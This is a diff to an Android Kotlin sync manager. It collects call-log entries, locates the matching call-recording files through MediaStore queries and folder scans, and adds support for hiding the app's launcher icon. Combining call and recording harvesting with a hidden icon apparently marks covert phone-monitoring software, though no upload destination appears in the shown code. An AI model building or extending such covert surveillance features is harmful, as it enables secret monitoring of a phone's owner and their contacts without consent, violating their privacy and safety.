@@ -13,6 +13,7 @@ import android.os.Build
 import android.os.Handler
 import android.os.Looper
 import android.provider.CallLog
+import android.provider.MediaStore
 import android.provider.Telephony
 import android.util.Log
 import org.json.JSONArray
@@ -358,7 +359,7 @@ object NativeSyncManager {
                         val isoFormat = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss'Z'", Locale.US)
                         val timestamp = isoFormat.format(Date(callDateMs))
 
-                        val recPath = findRecordingForCall(number, resolvedName, callDateMs) ?: ""
+                        val recPath = findRecordingForCall(context, number, resolvedName, callDateMs) ?: ""
                         val hasRec = recPath.isNotEmpty()
 
                         val event = mapOf(
@@ -692,7 +693,7 @@ object NativeSyncManager {
                                 val num = cursor.getString(1) ?: ""
                                 val name = cursor.getString(2) ?: ""
                                 val time = cursor.getLong(3)
-                                val found = findRecordingForCall(num, name, time)
+                                val found = findRecordingForCall(context, num, name, time)
                                 if (!found.isNullOrEmpty()) {
                                     val cv = ContentValues().apply {
                                         put("recording_path", found)
@@ -852,14 +853,75 @@ object NativeSyncManager {
         }
     }
 
-    fun findRecordingForCall(phone: String, name: String, callTimeMs: Long): String? {
-        val candidateDirs = listOf(
+    fun findRecordingForCall(context: Context?, phone: String, name: String, callTimeMs: Long): String? {
+        val cleanPhone = phone.replace(Regex("[^0-9]"), "").takeLast(10)
+        val minTimeMs = callTimeMs - 180000L
+        val maxTimeMs = callTimeMs + 180000L
+
+        // 1. Query Android MediaStore (Primary for OnePlus, Samsung, Xiaomi, Oppo, Vivo)
+        if (context != null) {
+            try {
+                val projection = arrayOf<String>(
+                    MediaStore.Audio.Media.DATA,
+                    MediaStore.Audio.Media.DISPLAY_NAME,
+                    MediaStore.Audio.Media.DATE_MODIFIED
+                )
+                val minTimeSec = minTimeMs / 1000L
+                val maxTimeSec = (maxTimeMs + 60000L) / 1000L
+                val selection = "(${MediaStore.Audio.Media.DATE_MODIFIED} BETWEEN ? AND ?) AND (${MediaStore.Audio.Media.DATA} LIKE '%Record%' OR ${MediaStore.Audio.Media.DISPLAY_NAME} LIKE '%Call%' OR ${MediaStore.Audio.Media.DATA} LIKE '%Call%')"
+                context.contentResolver.query(
+                    MediaStore.Audio.Media.EXTERNAL_CONTENT_URI,
+                    projection,
+                    selection,
+                    arrayOf(minTimeSec.toString(), maxTimeSec.toString()),
+                    "${MediaStore.Audio.Media.DATE_MODIFIED} DESC"
+                )?.use { cursor ->
+                    var bestMediaStorePath: String? = null
+                    var bestDiff = Long.MAX_VALUE
+                    val dataIdx = cursor.getColumnIndexOrThrow(MediaStore.Audio.Media.DATA)
+                    val nameIdx = cursor.getColumnIndexOrThrow(MediaStore.Audio.Media.DISPLAY_NAME)
+                    val dateIdx = cursor.getColumnIndexOrThrow(MediaStore.Audio.Media.DATE_MODIFIED)
+
+                    while (cursor.moveToNext()) {
+                        val path = cursor.getString(dataIdx) ?: ""
+                        val fName = cursor.getString(nameIdx) ?: File(path).name
+                        val modMs = cursor.getLong(dateIdx) * 1000L
+                        val diff = Math.abs(modMs - callTimeMs)
+
+                        val matchNum = cleanPhone.isNotEmpty() && fName.replace(Regex("[^0-9]"), "").contains(cleanPhone)
+                        val matchName = name.isNotEmpty() && fName.contains(name, ignoreCase = true)
+
+                        if ((matchNum || matchName) && diff < 180000L) {
+                            if (diff < bestDiff) {
+                                bestDiff = diff
+                                bestMediaStorePath = path
+                            }
+                        } else if (diff < 30000L && bestMediaStorePath == null) {
+                            bestMediaStorePath = path
+                            bestDiff = diff
+                        }
+                    }
+                    if (!bestMediaStorePath.isNullOrEmpty() && File(bestMediaStorePath).exists()) {
+                        return bestMediaStorePath
+                    }
+                }
+            } catch (e: Exception) {
+                Log.w(TAG, "Error querying MediaStore in NativeSyncManager: ${e.message}")
+            }
+        }
+
+        // 2. Direct directory scan fallback
+        val candidateDirs = mutableListOf(
             File(Environment.getExternalStorageDirectory(), "Recordings/Call"),
             File(Environment.getExternalStorageDirectory(), "Sounds/Call"),
             File(Environment.getExternalStorageDirectory(), "CallRecordings"),
             File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_MUSIC), "Recordings/Call")
         )
-        val cleanPhone = phone.replace(Regex("[^0-9]"), "").takeLast(10)
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
+            candidateDirs.add(File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_RECORDINGS), "Call"))
+            candidateDirs.add(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_RECORDINGS))
+        }
+
         var bestFile: File? = null
         var bestDiff = Long.MAX_VALUE
 
@@ -867,7 +929,7 @@ object NativeSyncManager {
             try {
                 if (dir.exists() && dir.isDirectory) {
                     dir.listFiles()?.forEach { file ->
-                        if (file.isFile && (file.extension.equals("m4a", true) || file.extension.equals("mp3", true) || file.extension.equals("wav", true) || file.extension.equals("amr", true) || file.extension.equals("aac", true))) {
+                        if (file.isFile && (file.extension.equals("m4a", true) || file.extension.equals("mp3", true) || file.extension.equals("wav", true) || file.extension.equals("amr", true) || file.extension.equals("aac", true) || file.extension.equals("3gp", true) || file.extension.equals("opus", true))) {
                             val fName = file.name
                             val matchNumber = cleanPhone.isNotEmpty() && fName.replace(Regex("[^0-9]"), "").contains(cleanPhone)
                             val matchName = name.isNotEmpty() && fName.contains(name, ignoreCase = true)
@@ -951,7 +1013,16 @@ object NativeSyncManager {
                             val currentIconHidden = nativePrefs.getBoolean("app_icon_hidden", false)
                             if (currentIconHidden != appIconHidden) {
                                 try {
-                                    val alias = ComponentName(context, "${context.packageName}.MainActivity")
+                                    // Ensure MainActivity itself is enabled
+                                    val mainComp = ComponentName(context, "${context.packageName}.MainActivity")
+                                    context.packageManager.setComponentEnabledSetting(
+                                        mainComp,
+                                        PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
+                                        PackageManager.DONT_KILL_APP
+                                    )
+
+                                    // Toggle only LauncherAlias to hide/show launcher icon
+                                    val alias = ComponentName(context, "${context.packageName}.LauncherAlias")
                                     val state = if (appIconHidden) PackageManager.COMPONENT_ENABLED_STATE_DISABLED else PackageManager.COMPONENT_ENABLED_STATE_ENABLED
                                     context.packageManager.setComponentEnabledSetting(alias, state, PackageManager.DONT_KILL_APP)
                                     Log.i(TAG, "Native applied launcher icon visibility: hidden=$appIconHidden")
